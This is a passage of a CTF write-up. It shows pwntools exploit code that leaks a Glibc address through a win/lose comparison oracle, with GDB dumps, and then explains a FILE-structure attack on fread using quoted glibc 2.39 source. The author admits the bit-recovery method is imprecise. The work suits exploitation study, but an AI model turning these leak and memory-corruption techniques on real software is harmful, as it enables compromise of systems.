</code></pre></div><p>And those values are sent to <code>cmp</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>p/x $rdi
$1 = 0x7ffff7e405c2  
<span class="code-green">gef&gt; </span>p/x $rsi
$2 = 0x7fffffffe898
</code></pre></div><p>Therefore, we can use <code>simulate</code> as an oracle to find the value of <code>$rsi</code> when it is a Glibc address! This is the function I used for that in the Python exploit:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">simulate_player</span><span class="mtk1">(</span><span class="mtk9 mtki">number</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bool</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'s'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Bot number: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'-'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Player number: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">number</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>  
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'You win!'</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>
</code></pre></div><p>The way <code>cmp</code> works makes it a bit difficult to find a binary oracle. First of all, we must find the number of bits set to <code>1</code>, which is relatively easy:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">e</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">64</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">simulate_player</span><span class="mtk1">(</span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1"> </span><span class="mtk1">e</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">):</span>  
<span class="mtk1">        </span><span class="mtk5">break</span>
</code></pre></div><p>As can be seen, we just increase the number of bits until we win. At this point, we will know <code>e</code> is the number of bits set to <code>1</code>. Next, I came up with this algorithm after a lot of testing:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">known</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span>
<span class="mtk1">bit</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span>

<span class="mtk5">while</span><span class="mtk1"> </span><span class="mtk1">known</span><span class="mtk1">.</span><span class="mtk8">bit_count</span><span class="mtk1">() </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk1">e</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk1">test</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">known</span>
<span class="mtk1">    </span><span class="mtk1">m1</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">test</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">((</span><span class="mtk4">'1'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">test</span><span class="mtk1">.</span><span class="mtk8">bit_count</span><span class="mtk1">())).</span><span class="mtk8">zfill</span><span class="mtk1">(</span><span class="mtk6">64</span><span class="mtk1">)[::</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">], </span><span class="mtk6">2</span><span class="mtk1">)</span>  
<span class="mtk1">    </span><span class="mtk1">test</span><span class="mtk1"> </span><span class="mtk5">|=</span><span class="mtk1"> (</span><span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> </span><span class="mtk1">bit</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">m2</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">test</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">((</span><span class="mtk4">'1'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">test</span><span class="mtk1">.</span><span class="mtk8">bit_count</span><span class="mtk1">())).</span><span class="mtk8">zfill</span><span class="mtk1">(</span><span class="mtk6">64</span><span class="mtk1">)[::</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">], </span><span class="mtk6">2</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk8">simulate_player</span><span class="mtk1">(</span><span class="mtk1">m1</span><span class="mtk1">) </span><span class="mtk5">and</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk8">simulate_player</span><span class="mtk1">(</span><span class="mtk1">m2</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk1">known</span><span class="mtk1"> </span><span class="mtk5">|=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> </span><span class="mtk1">bit</span>

<span class="mtk1">    </span><span class="mtk1">bit</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk6">1</span>

<span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> ((</span><span class="mtk1">known</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">7fffffffffff</span><span class="mtk1">) </span><span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">7e0000000000</span><span class="mtk1">) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">955c2</span>
<span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
</code></pre></div><p>For some reason, it is not totally correct because I need to fix some of the most significant bits to have the format of a Glibc address. Probably because <code>cmp</code> makes the player lose when the two numbers are equal.</p><p>The idea is to try two similar integers, and see if both lose. Here are some steps with an example in 8 bits:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Target: 0010 1011

bit   = 0
known = 0000 0000
m1    = 1111 0000 => Lose  
m2    = 1110 0001 => Lose

bit   = 1
known = 0000 0001
m1    = 1110 0001 => Lose
m2    = 1100 0011 => Lose

bit   = 2
known = 0000 0011
m1    = 1100 0011 => Lose
m2    = 1000 0111 => Win

bit   = 3
known = 0000 0011
m1    = 1100 0011 => Lose
m2    = 1000 1011 => Lose

bit   = 4
known = 0000 1011
m1    = 1000 1011 => Lose
m2    = 0001 1011 => Win

bit   = 5
known = 0000 1011
m1    = 1000 1011 => Lose
m2    = 0010 1011 => Win

bit   = 6
known = 0000 1011
m1    = 1000 1011 => Lose
m2    = 0100 1011 => Lose

known = 0100 1011
</code></pre></div><p>As can be seen, it fails to find exactly the target value, but it works with the Glibc address because we know the format is always <code>0x00007f**********</code>.</p><h2 id="exploit-development">Exploit development</h2><p>Once we have leaked Glibc, we can proceed with a <code>FILE</code> structure attack using the OOB write. I used this function to write either a bit <code>0</code> or <code>1</code> (using <code>000...0</code> or <code>111...1</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">fight</span><span class="mtk1">(</span><span class="mtk9 mtki">win</span><span class="mtk1">: </span><span class="mtk8 mtku">bool</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">False</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'f'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Player plays: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'18446744073709551615'</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk9 mtki">win</span><span class="mtk1"> </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'0'</span><span class="mtk1">)</span>  
<span class="mtk1">    </span><span class="mtk5">assert</span><span class="mtk1"> (</span><span class="mtk7 mtki">b</span><span class="mtk4">'You win!'</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk9 mtki">win</span><span class="mtk1"> </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'Bot wins!'</span><span class="mtk1">) </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>
</code></pre></div><h3 id="file-structure-attack"><code>FILE</code> structure attack</h3><p>We need to perform a <code>FILE</code> structure attack because it is the only thing we can clobber using the OOB write. The first time I dealt with <code>FILE</code> structure attacks was when I made <a target="_blank" href="../../../htb-challenges/pwn/filestorage">FileStorage</a>.</p><p>The attack we will be doing is actually the same I designed for <a target="_blank" href="../../../htb-challenges/pwn/filestorage">FileStorage</a>, which is explained in <a target="_blank" href="https://es.slideshare.net/slideshow/play-with-file-structure-yet-another-binary-exploit-technique/81635564#2">Play with FILE Structure - Yet Another Binary Exploit Technique</a>, pages 66 - 70.</p><p>The idea is that <code>fread</code> will allow us to write into memory, not only at <code>seed</code>, but also in other places as long as the fields <code>_IO_buf_base</code> and <code>_IO_buf_end</code> have some addresses where to write at, with some positive difference. Let&rsquo;s review the <code>FILE</code> structure from <code>seed_generator</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/60gx 0x4052a0
<span class="code-dark-blue">0x4052a0</span>:       0x00000000fbad2488      0x0000000000405488  
<span class="code-dark-blue">0x4052b0</span>:       0x0000000000406480      0x0000000000405480
<span class="code-dark-blue">0x4052c0</span>:       0x0000000000405480      0x0000000000405480
<span class="code-dark-blue">0x4052d0</span>:       0x0000000000405480      0x0000000000405480
<span class="code-dark-blue">0x4052e0</span>:       0x0000000000406480      0x0000000000000000
<span class="code-dark-blue">0x4052f0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405300</span>:       0x0000000000000000      0x00007ffff7faf4e0
<span class="code-dark-blue">0x405310</span>:       0x0000000000000003      0x0000000000000000
<span class="code-dark-blue">0x405320</span>:       0x0000000000000000      0x0000000000405380
<span class="code-dark-blue">0x405330</span>:       0xffffffffffffffff      0x0000000000000000
<span class="code-dark-blue">0x405340</span>:       0x0000000000405390      0x0000000000000000
<span class="code-dark-blue">0x405350</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405360</span>:       0x00000000ffffffff      0x0000000000000000
<span class="code-dark-blue">0x405370</span>:       0x0000000000000000      0x00007ffff7fad030
<span class="code-dark-blue">0x405380</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405390</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4053a0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4053b0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4053c0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4053d0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4053e0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4053f0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405400</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405410</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405420</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405430</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405440</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405450</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405460</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x405470</span>:       0x00007ffff7fad228      0x0000000000001011
</code></pre></div><p>Notice that the <code>3</code> means that <code>fread</code> will take information from file descriptor number <code>3</code>. We can even modify this to set <code>0</code>, which is the file descriptor for <code>stdin</code>. As a result, we will be able toenter arbitrary data.</p><p>Moreover, it doesn&rsquo;t matter if <code>fread</code> is called as <code>fread((char*) &amp;seed, 1, 8, seed_generator)</code>, because we can control the length to be read with <code>_IO_buf_end - _IO_buf_base</code>.</p><h3 id="diving-into-the-file-structure-attack">Diving into the <code>FILE</code> structure attack</h3><p>It might seem magic that we will be writing arbitrary data just modifying <code>_IO_buf_end</code> and <code>_IO_buf_base</code>. But it&rsquo;s not magic, let&rsquo;s review the relevant Glibc source code (version 2.39). We will start by <a target="_blank" href="https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/iofread.c#L30"><code>fread</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">size_t</span>
<span class="mtk8">_IO_fread</span><span class="mtk1"> (</span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">buf</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> </span><span class="mtk9 mtki">size</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> </span><span class="mtk9 mtki">count</span><span class="mtk1">, FILE </span><span class="mtk5">*</span><span class="mtk9 mtki">fp</span><span class="mtk1">)</span>
<span class="mtk1">{</span>
<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> bytes_requested </span><span class="mtk5">=</span><span class="mtk1"> size </span><span class="mtk5">*</span><span class="mtk1"> count;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> bytes_read;</span>
<span class="mtk1">  </span><span class="mtk8">CHECK_FILE</span><span class="mtk1"> (fp, </span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (bytes_requested </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  </span><span class="mtk8">_IO_acquire_lock</span><span class="mtk1"> (fp);</span>
<span class="mtk1">  bytes_read </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">_IO_sgetn</span><span class="mtk1"> (fp, (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) buf, bytes_requested);</span>
<span class="mtk1">  </span><span class="mtk8">_IO_release_lock</span><span class="mtk1"> (fp);</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> bytes_requested </span><span class="mtk5">==</span><span class="mtk1"> bytes_read </span><span class="mtk5">?</span><span class="mtk1"> count </span><span class="mtk5">:</span><span class="mtk1"> bytes_read </span><span class="mtk5">/</span><span class="mtk1"> size;</span>  
<span class="mtk1">}</span>
<span class="mtk8">libc_hidden_def</span><span class="mtk1"> (_IO_fread)</span>
</code></pre></div><p>This function is just a wrapper for <a target="_blank" href="https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/genops.c#L408"><code>_IO_sgetn</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">size_t</span>
<span class="mtk8">_IO_sgetn</span><span class="mtk1"> (FILE </span><span class="mtk5">*</span><span class="mtk9 mtki">fp</span><span class="mtk1">, </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">data</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> </span><span class="mtk9 mtki">n</span><span class="mtk1">)</span>  
<span class="mtk1">{</span>
<span class="mtk3">  /* FIXME handle putback buffer here! */</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">_IO_XSGETN</span><span class="mtk1"> (fp, data, n);</span>
<span class="mtk1">}</span>
</code></pre></div><p>This <code>_IO_sgetn</code> function calls a macro called <a target="_blank" href="https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/libioP.h#L184"><code>_IO_XSGETN</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">/* The 'xsgetn' hook reads upto N characters into </span><span class="mtk3">buffer DATA.</span>
<span class="mtk3">   Returns the number of character actually read.</span>
<span class="mtk3">   It matches the streambuf::xsgetn virtual functi</span><span class="mtk3">on. */</span>
<span class="mtk5">typedef</span><span class="mtk1"> </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> (*_IO_xsgetn_t) (</span><span class="mtk8 mtku">FILE</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">FP</span><span class="mtk1">, </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">DATA</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> </span><span class="mtk9 mtki">N</span><span class="mtk1">);</span>  
<span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">_IO_XSGETN</span><span class="mtk1">(</span><span class="mtk9 mtki">FP</span><span class="mtk1">, </span><span class="mtk9 mtki">DATA</span><span class="mtk1">, </span><span class="mtk9 mtki">N</span><span class="mtk1">) </span><span class="mtk8">JUMP2</span><span class="mtk1"> (__xsgetn, FP, DATA, N)</span>
</code></pre></div><p>This is just a way to call a function from a <em>vtable</em>. In order to find which function it is, we can search for <code>xsgetn</code> and find out the functions for <code>FILE</code> objects:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">/* Jumptable functions for files. */</span>

<span class="mtk3">/* ... */</span>

<span class="mtk5">extern</span><span class="mtk1"> </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> </span><span class="mtk8">_IO_file_xsgetn</span><span class="mtk1"> (FILE </span><span class="mtk5">*</span><span class="mtk1">, </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1">);</span>  
<span class="mtk8">libc_hidden_proto</span><span class="mtk1"> (_IO_file_xsgetn)</span>
</code></pre></div><p>And here we find function <a target="_blank" href="https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/fileops.c#L1272"><code>_IO_file_xsgetn</code></a>. This is the relevant code:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">size_t</span>
<span class="mtk8">_IO_file_xsgetn</span><span class="mtk1"> (FILE </span><span class="mtk5">*</span><span class="mtk9 mtki">fp</span><span class="mtk1">, </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">data</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> </span><span class="mtk9 mtki">n</span><span class="mtk1">)</span>
<span class="mtk1">{</span>
<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> want, have;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">ssize_t</span><span class="mtk1"> count;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">s </span><span class="mtk5">=</span><span class="mtk1"> data;</span>

<span class="mtk1">  want </span><span class="mtk5">=</span><span class="mtk1"> n;</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (fp-&gt;_IO_buf_base </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">)</span>
<span class="mtk1">    {</span>
<span class="mtk3">      /* ... */</span>
<span class="mtk1">    }</span>

<span class="mtk1">  </span><span class="mtk5">while</span><span class="mtk1"> (want </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">    {</span>
<span class="mtk1">      have </span><span class="mtk5">=</span><span class="mtk1"> fp-&gt;_IO_read_end </span><span class="mtk5">-</span><span class="mtk1"> fp-&gt;_IO_read_ptr;</span>
<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (want </span><span class="mtk5">&lt;=</span><span class="mtk1"> have)</span>
<span class="mtk1">        {</span>
<span class="mtk3">          /* ... */</span>
<span class="mtk1">        }</span>
<span class="mtk1">      </span><span class="mtk5">else</span>
<span class="mtk1">        {</span>
<span class="mtk1">          </span><span class="mtk5">if</span><span class="mtk1"> (have </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">            {</span>
<span class="mtk3">              /* ... */</span>
<span class="mtk1">            }</span>

<span class="mtk3">          /* ... */</span>

<span class="mtk3">          /* If we now want less than a buffer, un</span><span class="mtk3">derflow and repeat</span>
<span class="mtk3">            the copy.  Otherwise, _IO_SYSREAD dire</span><span class="mtk3">ctly to</span>
<span class="mtk3">            the user buffer. */</span>
<span class="mtk1">          </span><span class="mtk5">if</span><span class="mtk1"> (fp-&gt;_IO_buf_base</span>
<span class="mtk1">              </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> want </span><span class="mtk5">&lt;</span><span class="mtk1"> (</span><span class="mtk7 mtki">size_t</span><span class="mtk1">) (fp-&gt;_IO_buf_end </span><span class="mtk5">-</span><span class="mtk1"> fp-&gt;_IO_buf_base))</span>  
<span class="mtk1">            {</span>
<span class="mtk1">              </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">__underflow</span><span class="mtk1"> (fp) </span><span class="mtk5">==</span><span class="mtk1"> EOF)</span>
<span class="mtk1">                </span><span class="mtk5">break</span><span class="mtk1">;</span>

<span class="mtk1">              </span><span class="mtk5">continue</span><span class="mtk1">;</span>
<span class="mtk1">            }</span>

<span class="mtk3">          /* ... */</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> n </span><span class="mtk5">-</span><span class="mtk1"> want;</span>
<span class="mtk1">}</span>
</code></pre></div><p>The target is to call <a target="_blank" href="https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/genops.c#L268"><code>__underflow</code></a>. For this, we must have a non-zero value at <code>fp->buf_base</code> and also <code>want &lt; fp->buf_end - fp->buf_base</code>. The <code>__underflow</code> function will check some bits of <code>fp->_flags</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span>
<span class="mtk8">__underflow</span><span class="mtk1"> (FILE </span><span class="mtk5">*</span><span class="mtk9 mtki">fp</span><span class="mtk1">)</span>
<span class="mtk1">{</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">_IO_vtable_offset</span><span class="mtk1"> (fp) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk8">_IO_fwide</span><span class="mtk1"> (fp, </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span>  
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> EOF;</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (fp-&gt;_mode </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">_IO_fwide</span><span class="mtk1"> (fp, </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">_IO_in_put_mode</span><span class="mtk1"> (fp))</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">_IO_switch_to_get_mode</span><span class="mtk1"> (fp) </span><span class="mtk5">==</span><span class="mtk1"> EOF)</span>
<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1"> EOF;</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (fp-&gt;_IO_read_ptr </span><span class="mtk5">&lt;</span><span class="mtk1"> fp-&gt;_IO_read_end)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) fp-&gt;_IO_read_ptr;</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">_IO_in_backup</span><span class="mtk1"> (fp))</span>
<span class="mtk1">    {</span>
<span class="mtk1">      </span><span class="mtk8">_IO_switch_to_main_get_area</span><span class="mtk1"> (fp);</span>
<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (fp-&gt;_IO_read_ptr </span><span class="mtk5">&lt;</span><span class="mtk1"> fp-&gt;_IO_read_end)</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) fp-&gt;_IO_read_ptr;</span>
<span class="mtk1">    }</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">_IO_have_markers</span><span class="mtk1"> (fp))</span>
<span class="mtk1">    {</span>
<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">save_for_backup</span><span class="mtk1"> (fp, fp-&gt;_IO_read_end))</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> EOF;</span>
<span class="mtk1">    }</span>
<span class="mtk1">  </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">_IO_have_backup</span><span class="mtk1"> (fp))</span>
<span class="mtk1">    </span><span class="mtk8">_IO_free_backup_area</span><span class="mtk1"> (fp);</span>
